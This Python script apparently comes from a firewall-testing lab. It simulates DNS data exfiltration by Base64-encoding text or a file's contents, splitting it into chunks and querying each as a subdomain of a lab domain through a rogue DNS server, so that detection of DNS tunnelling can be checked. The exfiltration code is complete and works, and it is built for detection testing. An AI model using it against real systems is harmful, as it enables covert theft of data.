#!/usr/bin/env python3
"""
UC3 – DNS Data Exfiltration
==============================
Simulates data exfiltration over DNS by encoding a user-supplied text as
Base64, splitting it into random-length chunks (10–20 chars each), and
issuing a DNS A query for every chunk as a subdomain of the base domain.

Pattern:
  <b64_chunk>.<index>.exfil.lab  →  DNS A query
  e.g. Q29uZmlkZW50.1.exfil.lab

The rogue DNS server (Azure CoreDNS) responds to *.exfil.lab queries with
random IPs, simulating a real attacker-controlled exfil endpoint.
The PAN-OS firewall should detect the high-entropy subdomain pattern and
classify it as DNS tunnelling / data exfiltration.

Modes:
  DRY_RUN=False  →  queries are sent to DNS_RESOLVER (firewall → rogue DNS)
  DRY_RUN=True   →  queries are only printed, nothing is sent

Usage:
  python uc3_dns_exfiltration.py --data "secret text" [--base-domain exfil.lab]
  python uc3_dns_exfiltration.py --file path/to/secret.txt
"""

import argparse
import base64
import json
import os
import random
import sys
import time
from datetime import datetime

import dns.resolver
from colorama import Fore, Style, init
from tqdm import tqdm

sys.path.insert(0, os.path.dirname(__file__))
import config

init(autoreset=True)


def encode_data(text: str) -> str:
    """Return URL-safe Base64 of text (no padding '=' to keep it DNS-safe)."""
    b64 = base64.urlsafe_b64encode(text.encode()).decode()
    return b64.replace("=", "")          # strip padding – safe for subdomain


def chunk_data(b64_string: str, min_len: int, max_len: int) -> list[str]:
    """Split b64_string into variable-length chunks."""
    chunks = []
    i = 0
    while i < len(b64_string):
        size = random.randint(min_len, max_len)
        chunks.append(b64_string[i:i + size])
        i += size
    return chunks


def build_fqdn(chunk: str, idx: int, base_domain: str, indexed: bool) -> str:
    """Build the DNS query label from a chunk."""
    if indexed:
        return f"{chunk}.{idx}.{base_domain}"
    return f"{chunk}.{base_domain}"


def send_query(resolver_obj, fqdn: str) -> dict:
    """Issue a DNS A query and return the result."""
    try:
        answers = resolver_obj.resolve(fqdn, "A")
        return {"fqdn": fqdn, "status": "RESOLVED", "ips": [r.address for r in answers]}
    except dns.resolver.NXDOMAIN:
        return {"fqdn": fqdn, "status": "NXDOMAIN", "ips": []}
    except dns.resolver.NoAnswer:
        return {"fqdn": fqdn, "status": "NO_ANSWER", "ips": []}
    except dns.resolver.Timeout:
        return {"fqdn": fqdn, "status": "TIMEOUT", "ips": []}
    except dns.exception.DNSException as e:
        return {"fqdn": fqdn, "status": "ERROR", "ips": [], "error": str(e)}


def main():
    parser = argparse.ArgumentParser(description="UC3 – DNS Data Exfiltration")
    parser.add_argument("--data", default=None, help="String to exfiltrate")
    parser.add_argument("--file", default=None, help="File whose content to exfiltrate")
    parser.add_argument("--base-domain", default=config.EXFIL_BASE_DOMAIN)
    parser.add_argument("--resolver", default=config.DNS_RESOLVER, help="Resolver (firewall IP)")
    parser.add_argument("--chunk-min", type=int, default=config.EXFIL_CHUNK_MIN)
    parser.add_argument("--chunk-max", type=int, default=config.EXFIL_CHUNK_MAX)
    parser.add_argument("--dry-run", action="store_true", default=config.DRY_RUN)
    args = parser.parse_args()

    # --- Get payload ---
    if args.file:
        with open(args.file) as f:
            payload = f.read()
    elif args.data:
        payload = args.data
    else:
        payload = input("Enter data to exfiltrate: ")

    b64 = encode_data(payload)
    chunks = chunk_data(b64, args.chunk_min, args.chunk_max)
    fqdns = [build_fqdn(c, i + 1, args.base_domain, config.EXFIL_INDEXED) for i, c in enumerate(chunks)]

    print(f"\n{'='*70}")
    print(f"  UC3 – DNS Data Exfiltration")
    print(f"  Resolver    : {args.resolver}")
    print(f"  Base domain : {args.base_domain}")
    print(f"  Dry-run     : {args.dry_run}")
    print(f"  Payload     : {len(payload)} chars → {len(b64)} B64 chars → {len(chunks)} chunks")
    print(f"{'='*70}\n")

    print(f"  {'#':<5} {'FQDN':<65} Status")
    print(f"  {'-'*80}")

    if args.dry_run:
        for i, fqdn in enumerate(fqdns, 1):
            print(f"  {Fore.YELLOW}[DRY] {i:<4}{Style.RESET_ALL} {fqdn}")
        print(f"\n{Fore.YELLOW}[DRY-RUN] No queries sent.")
        return

    resolver = dns.resolver.Resolver(configure=False)
    resolver.nameservers = [args.resolver]
    resolver.timeout = config.QUERY_TIMEOUT
    resolver.lifetime = config.QUERY_TIMEOUT

    results = []
    for i, fqdn in enumerate(tqdm(fqdns, desc="Exfiltrating", unit="chunk"), 1):
        r = send_query(resolver, fqdn)
        results.append(r)

        status_color = Fore.RED if r["status"] == "RESOLVED" else Fore.GREEN
        ips = ", ".join(r["ips"]) if r["ips"] else "-"
        print(f"  {i:<5} {fqdn:<65} {status_color}{r['status']}{Style.RESET_ALL}  {ips}")
        time.sleep(config.QUERY_DELAY_SEC)

    # Summary
    resolved = [r for r in results if r["status"] == "RESOLVED"]
    blocked  = [r for r in results if r["status"] in ("NXDOMAIN", "NO_ANSWER")]
    timeouts = [r for r in results if r["status"] == "TIMEOUT"]

    print(f"\n{'='*70}")
    print(f"  RESULTS SUMMARY")
    print(f"  Total chunks         : {len(results)}")
    print(f"  Delivered (RESOLVED) : {Fore.RED}{len(resolved)}{Style.RESET_ALL}")
    print(f"  Blocked              : {Fore.GREEN}{len(blocked)}{Style.RESET_ALL}")
    print(f"  Timeouts             : {Fore.YELLOW}{len(timeouts)}{Style.RESET_ALL}")
    print(f"{'='*70}\n")

    os.makedirs(config.RESULTS_DIR, exist_ok=True)
    out_file = os.path.join(config.RESULTS_DIR, f"uc3_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(out_file, "w") as f:
        json.dump({
            "resolver": args.resolver,
            "base_domain": args.base_domain,
            "timestamp": datetime.now().isoformat(),
            "payload_length": len(payload),
            "b64_length": len(b64),
            "chunk_count": len(chunks),
            "delivered": len(resolved),
            "blocked": len(blocked),
            "queries": results,
        }, f, indent=2)
    print(f"{Fore.CYAN}[*] Results saved to: {out_file}")


if __name__ == "__main__":
    main()
